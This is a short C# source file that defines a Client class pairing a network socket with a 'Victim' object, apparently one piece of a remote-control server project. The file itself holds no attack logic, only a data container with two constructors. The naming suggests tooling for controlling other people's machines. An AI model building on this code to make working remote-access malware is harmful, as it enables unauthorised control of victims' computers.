using System.Net.Sockets;

namespace Wubalubadubdub_Server
{
    public class Client
    {
        public Victim target;
        public Socket socket;

        public Client(Victim target, Socket socket)
        {
            this.target = target;
            this.socket = socket;
        }
        public Client(Socket socket)
        {
            this.socket = socket;
        }
    }
}